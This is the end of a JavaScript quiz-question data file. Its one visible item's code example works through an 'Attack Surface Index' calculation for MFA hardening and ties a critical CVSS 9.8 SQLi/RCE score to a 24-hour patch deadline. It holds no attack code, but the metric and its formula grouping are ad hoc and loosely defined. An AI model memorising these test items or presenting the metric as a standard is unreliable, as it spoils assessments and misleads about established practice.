    codeExample: `// Web Application Attack Surface Index (ASI) Mathematical Proof:
// Public Endpoints = 50, Parameters = 200, Public Weight = 1.0 ➔ Initial ASI = 250.0
// Hardened Architecture: 40 Endpoints moved behind MFA Auth (Weight = 0.2)
// Hardened ASI: (10 + 40)*1.0 + (40 + 160)*0.2 = 50 + 40 = 90.0 (64% Attack Surface Reduction!)
// CVSS v3.1 Criticality: Base Score = 9.8 (Critical SQLi / RCE) ➔ Mandatory 24-Hour Patch SLA!`
  }
];

export default questions;
